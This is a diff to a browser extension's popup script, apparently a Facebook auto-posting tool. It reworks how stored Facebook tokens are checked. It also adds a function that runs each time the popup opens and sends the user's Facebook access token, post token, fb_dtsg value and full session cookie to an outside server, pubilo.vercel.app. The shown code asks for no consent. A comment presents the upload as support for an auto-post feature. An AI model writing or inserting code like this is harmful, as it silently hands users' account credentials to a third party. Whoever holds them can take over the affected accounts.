@@ -97,35 +97,54 @@ function hideUserInfo() {
 // Check Facebook login status on popup open
 async function checkStatus() {
   try {
-    // First trigger token fetch to ensure we have latest data
-    const tokenResponse = await chrome.runtime.sendMessage({ action: "fetchToken" });
-    console.log("[Popup] Token fetch result:", tokenResponse);
+    // Get stored data first
+    let tokenResponse = await chrome.runtime.sendMessage({ action: "getStoredData" });
+    console.log("[Popup] Stored data:", tokenResponse);
+
+    // If no token stored, fetch for the first time
+    if (!tokenResponse || !tokenResponse.accessToken) {
+      console.log("[Popup] No stored token, fetching...");
+      updateBadge(tokenBadge, "loading", "Token");
+      updateBadge(cookieBadge, "loading", "Cookie");
+      updateBadge(postBadge, "loading", "Post");
+
+      tokenResponse = await chrome.runtime.sendMessage({ action: "fetchToken" });
+      console.log("[Popup] Fetch result:", tokenResponse);
+    }
 
     // Update token badge
     if (tokenResponse && tokenResponse.fewfeed_accessToken) {
+      updateBadge(tokenBadge, "", "Token");
+    } else if (tokenResponse && tokenResponse.accessToken) {
       updateBadge(tokenBadge, "", "Token");
     } else {
       updateBadge(tokenBadge, "error", "Token");
     }
 
     // Update cookie badge
-    if (tokenResponse && tokenResponse.fewfeed_cookie) {
+    const hasCookie = tokenResponse && (tokenResponse.cookie || tokenResponse.fewfeed_cookie);
+    if (hasCookie) {
       updateBadge(cookieBadge, "", "Cookie");
     } else {
       updateBadge(cookieBadge, "error", "Cookie");
     }
 
     // Update post token badge
-    if (tokenResponse && tokenResponse.fewfeed_postToken) {
+    const hasPostToken = tokenResponse && (tokenResponse.postToken || tokenResponse.fewfeed_postToken);
+    const hasAdsToken = tokenResponse && (tokenResponse.accessToken || tokenResponse.fewfeed_accessToken);
+
+    if (hasPostToken) {
       updateBadge(postBadge, "", "Post");
-    } else {
-      // Auto-trigger OAuth to get post token
+    } else if (hasAdsToken) {
+      // Has ads token but no post token - auto-trigger OAuth
       updateBadge(postBadge, "loading", "Post");
       console.log("[Popup] No post token, triggering OAuth...");
       chrome.runtime.sendMessage({ action: "refreshPostToken" });
 
       // Wait and check again
       await waitForPostToken();
+    } else {
+      updateBadge(postBadge, "error", "Post");
     }
 
     const response = await chrome.runtime.sendMessage({ action: "getFacebookCookies" });
@@ -155,6 +174,9 @@ async function checkStatus() {
 
       showUserInfo();
       loginBtn.classList.add("hidden");
+
+      // Save tokens to server database for Auto-Post feature
+      saveTokensToServer(response.userId, data.fewfeed_userName || "Facebook User");
     } else {
       hideUserInfo();
       openBtn.classList.add("hidden");
@@ -192,6 +214,64 @@ loginBtn.addEventListener("click", () => {
   chrome.tabs.create({ url: "https://www.facebook.com/" });
   window.close();
 });
+
+// Save tokens to server database (with 24-hour cache to avoid spam)
+const SERVER_SAVE_INTERVAL = 24 * 60 * 60 * 1000; // 24 hours
+
+async function saveTokensToServer(userId, userName, forceSync = false) {
+  try {
+    // Check if we already saved recently (unless force sync)
+    if (!forceSync) {
+      const { fewfeed_lastServerSave } = await chrome.storage.local.get(["fewfeed_lastServerSave"]);
+      const now = Date.now();
+
+      if (fewfeed_lastServerSave && (now - fewfeed_lastServerSave) < SERVER_SAVE_INTERVAL) {
+        const hoursAgo = Math.round((now - fewfeed_lastServerSave) / (60 * 60 * 1000));
+        console.log("[Popup] Skipping server save - already saved", hoursAgo, "hours ago");
+        return;
+      }
+    }
+
+    const data = await chrome.storage.local.get([
+      "fewfeed_accessToken",
+      "fewfeed_postToken",
+      "fewfeed_fbDtsg",
+      "fewfeed_cookie"
+    ]);
+
+    // Only save if we have tokens
+    if (!data.fewfeed_accessToken && !data.fewfeed_postToken) {
+      console.log("[Popup] Skipping server save - no tokens to save");
+      return;
+    }
+
+    const response = await fetch("https://pubilo.vercel.app/api/tokens", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userId: userId,
+        userName: userName,
+        accessToken: data.fewfeed_accessToken,
+        postToken: data.fewfeed_postToken,
+        fbDtsg: data.fewfeed_fbDtsg,
+        cookie: data.fewfeed_cookie
+      })
+    });
+
+    const result = await response.json();
+    if (result.success) {
+      // Mark save time
+      await chrome.storage.local.set({ fewfeed_lastServerSave: Date.now() });
+      console.log("[Popup] Tokens saved to server - pages updated:", result.pagesUpdated);
+      return true;
+    } else {
+      console.error("[Popup] Failed to save tokens:", result.error);
+      return false;
+    }
+  } catch (error) {
+    console.error("[Popup] Error saving tokens to server:", error);
+  }
+}
 
 // Run on popup open
 checkStatus();
